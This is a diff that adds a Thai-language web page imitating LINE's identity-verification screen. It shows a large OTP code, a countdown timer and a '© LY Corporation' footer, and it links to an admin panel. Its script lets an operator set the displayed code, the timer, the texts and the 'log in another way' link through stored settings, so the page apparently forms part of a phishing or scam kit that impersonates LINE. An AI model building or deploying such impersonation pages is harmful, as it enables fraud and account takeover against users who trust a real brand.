@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>รหัสยืนยันตัวตน - LINE</title>
+    <style>
+        :root {
+            --bg-color: #1a1a1a;
+            --container-bg: #2a2a2a;
+            --line-green: #00c851;
+            --text-primary: #ffffff;
+            --text-secondary: #cccccc;
+            --text-muted: #888888;
+            --link-color: #4285f4;
+            --code-bg: #333333;
+            --code-border: #555555;
+            
+            /* ขนาดและสัดส่วน */
+            --container-width: 400px;
+            --container-padding: 40px;
+            --border-radius: 15px;
+            --font-size-title: 32px;
+            --font-size-heading: 24px;
+            --font-size-description: 16px;
+            --font-size-code: 48px;
+            --font-size-timer: 14px;
+            --font-size-info: 14px;
+            --font-size-link: 14px;
+            
+            /* ระยะห่าง */
+            --spacing-sections: 30px;
+            --spacing-elements: 20px;
+            --code-padding: 20px;
+            --code-margin: 25px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg-color);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: var(--container-bg);
+            padding: var(--container-padding);
+            border-radius: var(--border-radius);
+            width: 100%;
+            max-width: var(--container-width);
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .line-logo {
+            color: var(--line-green);
+            font-size: var(--font-size-title);
+            font-weight: bold;
+            margin-bottom: var(--spacing-sections);
+            letter-spacing: 2px;
+        }
+
+        .heading {
+            font-size: var(--font-size-heading);
+            color: var(--text-primary);
+            margin-bottom: var(--spacing-elements);
+            font-weight: 600;
+        }
+
+        .description {
+            font-size: var(--font-size-description);
+            color: var(--text-secondary);
+            margin-bottom: var(--code-margin);
+            line-height: 1.5;
+        }
+
+        .verification-code {
+            background: var(--code-bg);
+            border: 2px solid var(--code-border);
+            border-radius: 10px;
+            padding: var(--code-padding);
+            margin: var(--code-margin) 0;
+            display: inline-block;
+            min-width: 200px;
+        }
+
+        .code-display {
+            font-size: var(--font-size-code);
+            color: var(--line-green);
+            font-weight: bold;
+            letter-spacing: 8px;
+            margin-bottom: 10px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .timer {
+            font-size: var(--font-size-timer);
+            color: var(--text-muted);
+        }
+
+        .info-text {
+            font-size: var(--font-size-info);
+            color: var(--text-secondary);
+            margin: var(--spacing-sections) 0 var(--spacing-elements) 0;
+            line-height: 1.4;
+        }
+
+        .alternative-link {
+            font-size: var(--font-size-link);
+            color: var(--link-color);
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s ease;
+        }
+
+        .alternative-link:hover {
+            border-bottom-color: var(--link-color);
+            opacity: 0.8;
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+
+        .admin-controls {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+
+        .admin-controls a {
+            color: var(--link-color);
+            text-decoration: none;
+            margin-left: 10px;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+                margin: 10px;
+            }
+            
+            .line-logo {
+                font-size: 28px;
+            }
+            
+            .heading {
+                font-size: 20px;
+            }
+            
+            .code-display {
+                font-size: 36px;
+                letter-spacing: 4px;
+            }
+            
+            .verification-code {
+                min-width: 160px;
+                padding: 15px;
+            }
+        }
+
+        /* Animation */
+        .container {
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .code-display {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="line-logo" id="lineTitle">LINE</div>
+        
+        <div class="heading" id="verificationHeading">รหัสยืนยันตัวตน</div>
+        
+        <div class="description" id="verificationDescription">
+            กรุณากรอกรหัสยืนยันที่ได้รับทาง LINE อย่างน้อย 4 หลัก
+        </div>
+        
+        <div class="verification-code">
+            <div class="code-display" id="codeDisplay">6085</div>
+            <div class="timer" id="timerDisplay">เหลือเวลา <span id="countdown">02:50</span></div>
+        </div>
+        
+        <div class="info-text" id="infoText">
+            ไม่ได้รับรหัสยืนยันผ่าน LINE<br>
+            สำหรับเฉพาะท่านใหม่
+        </div>
+        
+        <a href="#" class="alternative-link" id="alternativeLink">เข้าสู่ระบบด้วยวิธีอื่น</a>
+    </div>
+
+    <div class="footer">
+        © LY Corporation
+    </div>
+
+    <div class="admin-controls">
+        <a href="dashboard.html">หน้าแรก</a>
+        <a href="admin.html">ตั้งค่า</a>
+        <a href="index.html">ล็อกอิน</a>
+    </div>
+
+    <script>
+        // Timer countdown
+        let timeLeft = 170; // 2:50 in seconds
+        
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            const formattedTime = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            document.getElementById('countdown').textContent = formattedTime;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+            } else {
+                // Timer expired
+                document.getElementById('countdown').textContent = '00:00';
+                document.getElementById('timerDisplay').innerHTML = 'หมดเวลา <span style="color: #ff4444;">กรุณาขอรหัสใหม่</span>';
+            }
+        }
+        
+        // Update timer every second
+        setInterval(updateTimer, 1000);
+        
+        // Load saved settings from localStorage
+        function loadSettings() {
+            // ตรวจสอบ OTP จาก localStorage ก่อน
+            const currentOTP = localStorage.getItem('currentOTP');
+            const otpExpiry = localStorage.getItem('otpExpiry');
+            
+            if (currentOTP && otpExpiry) {
+                const now = Date.now();
+                if (now < parseInt(otpExpiry)) {
+                    // OTP ยังไม่หมดอายุ ใช้ OTP จาก localStorage
+                    document.getElementById('codeDisplay').textContent = currentOTP;
+                    
+                    // คำนวณเวลาที่เหลือ
+                    const remainingTime = Math.floor((parseInt(otpExpiry) - now) / 1000);
+                    timeLeft = remainingTime > 0 ? remainingTime : 0;
+                } else {
+                    // OTP หมดอายุแล้ว ลบออกจาก localStorage
+                    localStorage.removeItem('currentOTP');
+                    localStorage.removeItem('otpExpiry');
+                }
+            }
+            
+            const settings = JSON.parse(localStorage.getItem('verificationSettings') || '{}');
+            
+            // Apply colors
+            if (settings.colors) {
+                Object.keys(settings.colors).forEach(key => {
+                    document.documentElement.style.setProperty(`--${key}`, settings.colors[key]);
+                });
+            }
+            
+            // Apply text content
+            if (settings.texts) {
+                Object.keys(settings.texts).forEach(key => {
+                    const element = document.getElementById(key);
+                    if (element && settings.texts[key]) {
+                        if (key === 'infoText') {
+                            element.innerHTML = settings.texts[key];
+                        } else {
+                            element.textContent = settings.texts[key];
+                        }
+                    }
+                });
+            }
+            
+            // Apply sizes
+            if (settings.sizes) {
+                Object.keys(settings.sizes).forEach(key => {
+                    document.documentElement.style.setProperty(`--${key}`, settings.sizes[key] + 'px');
+                });
+            }
+            
+            // Apply verification code
+            if (settings.verificationCode) {
+                document.getElementById('codeDisplay').textContent = settings.verificationCode;
+            }
+            
+            // Apply timer
+            if (settings.timerMinutes) {
+                timeLeft = settings.timerMinutes * 60;
+            }
+            
+            // Apply alternative link
+            if (settings.alternativeUrl) {
+                document.getElementById('alternativeLink').href = settings.alternativeUrl;
+            }
+        }
+        
+        // Load settings on page load
+        document.addEventListener('DOMContentLoaded', loadSettings);
+        
+        // Handle alternative link click
+        document.getElementById('alternativeLink').addEventListener('click', function(e) {
+            const href = this.getAttribute('href');
+            if (href === '#' || !href) {
+                e.preventDefault();
+                alert('กรุณาตั้งค่า URL สำหรับลิงก์นี้ใน Admin Panel');
+            }
+        });
+    </script>
+</body>
+</html>
+
